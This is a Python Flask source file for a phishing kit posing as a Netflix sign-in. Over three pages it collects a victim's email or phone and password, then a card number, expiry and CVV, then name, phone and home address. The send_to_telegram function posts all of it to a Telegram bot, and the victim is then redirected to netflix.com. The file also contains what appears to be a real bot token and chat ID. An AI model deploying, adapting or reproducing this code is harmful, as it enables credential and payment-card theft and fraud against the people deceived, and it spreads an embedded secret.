from flask import Flask, render_template, request, redirect, url_for, session, flash
import requests
import re
import os

app = Flask(__name__)
app.secret_key = "replace-with-a-very-random-secret-string"  # <<< EDIT: replace with a random secret

# ------------------ CONFIG: EDIT THESE BEFORE RUNNING ------------------
TELEGRAM_BOT_TOKEN = "8255245995:AAFZG__SHRNKCajEP-LWQzBKO4fqgi1ve4I"   # <<< EDIT: your BotFather token (keep quotes)
TELEGRAM_CHAT_ID   = "5692748706"     # <<< EDIT: your numeric chat id as a string
FINAL_REDIRECT_URL = "https://www.netflix.com/"  # <<< EDIT: destination after submit
# Editable field labels (you can change these later)
LABEL_SECOND_FIELD  = "Password"    # <<< EDIT: e.g. "Friend's name" or "Mother's name"
LABEL_16_DIGIT_NAME = "Card Number"      # <<< EDIT: label shown above the 16-digit input
LABEL_3_DIGIT_NAME  = "Cvv Code"         # <<< EDIT: label for the 3-digit input
# ----------------------------------------------------------------------

TELEGRAM_API_BASE = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

def send_to_telegram(text):
    """
    Send a plain text message to the Telegram chat via Bot API.
    Returns True if delivered (HTTP 200/OK), False otherwise.
    """
    try:
        r = requests.post(f"{TELEGRAM_API_BASE}/sendMessage",
                          data={"chat_id": TELEGRAM_CHAT_ID, "text": text},
                          timeout=10)
        if not r.ok:
            print("Telegram API error:", r.status_code, r.text)
        return r.ok
    except Exception as e:
        print("Exception sending to Telegram:", e)
        return False

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/signin", methods=["GET", "POST"])
def signin():
    # Step 1: contact (phone/email) + editable second field
    if request.method == "POST":
        contact = request.form.get("contact", "").strip()
        second = request.form.get("second_field", "").strip()
        if not contact:
            flash("Please enter your mobile number or email.")
            return redirect(url_for("signin"))
        session['contact'] = contact
        session['second_field'] = second
        return redirect(url_for("code_page"))
    prefill = request.args.get("email", "")
    return render_template("signin.html", second_label=LABEL_SECOND_FIELD, prefill=prefill)

@app.route("/code", methods=["GET", "POST"])
def code_page():
    # Step 2: 16-digit code + expiry + 3-digit code
    if request.method == "POST":
        code16 = request.form.get("code16", "").strip()
        exp_month = request.form.get("exp_month", "").strip()
        exp_year = request.form.get("exp_year", "").strip()
        code3 = request.form.get("code3", "").strip()

        # server-side validation: exactly 16 digits and exactly 3 digits
        if not re.fullmatch(r"\d{16}", code16):
            flash("Code must be exactly 16 digits.")
            return redirect(url_for("code_page"))
        if not re.fullmatch(r"\d{3}", code3):
            flash("3-digit code must be exactly 3 digits.")
            return redirect(url_for("code_page"))

        session['code16'] = code16
        session['exp_month'] = exp_month
        session['exp_year'] = exp_year
        session['code3'] = code3

        return redirect(url_for("address"))
    months = [f"{m:02d}" for m in range(1,13)]
    years = [str(y) for y in range(2025, 2036)]
    return render_template("code.html", label16=LABEL_16_DIGIT_NAME, label3=LABEL_3_DIGIT_NAME, months=months, years=years)

@app.route("/address", methods=["GET", "POST"])
def address():
    # Step 3: address page (last). On POST -> send everything to Telegram
    if request.method == "POST":
        full_name = request.form.get("full_name", "").strip()
        phone = request.form.get("phone", "").strip()
        address_text = request.form.get("address", "").strip()
        city = request.form.get("city", "").strip()
        state = request.form.get("state", "").strip()
        zipcode = request.form.get("zipcode", "").strip()

        if not all([full_name, phone, address_text, zipcode]):
            flash("Please fill all required fields.")
            return redirect(url_for("address"))

        if not re.fullmatch(r"\d{3,10}", zipcode):
            flash("ZIP/postal code looks invalid.")
            return redirect(url_for("address"))

        # Build message
        lines = [
            "✅ New submission from website",
            f"Contact (phone/email): {session.get('contact','')}",
            f"{LABEL_SECOND_FIELD}: {session.get('second_field','')}",
            f"{LABEL_16_DIGIT_NAME}: {session.get('code16','')}",
            f"Expiry (MM/YYYY): {session.get('exp_month','')}/{session.get('exp_year','')}",
            f"{LABEL_3_DIGIT_NAME}: {session.get('code3','')}",
            f"Full name: {full_name}",
            f"Phone: {phone}",
            f"Address: {address_text}",
            f"City: {city}",
            f"State: {state}",
            f"ZIP: {zipcode}"
        ]
        message_text = "\n".join(lines)

        ok = send_to_telegram(message_text)
        if not ok:
            flash("Warning: Could not send to Telegram. Check token/chat ID and server connection.")
            # continue to redirect even if Telegram failed
        session.clear()
        return redirect(FINAL_REDIRECT_URL)
    return render_template("address.html")

@app.route("/success")
def success():
    return render_template("success.html")

if __name__ == "__main__":
    # run on 127.0.0.1:5000 for local testing
    app.run(debug=True)
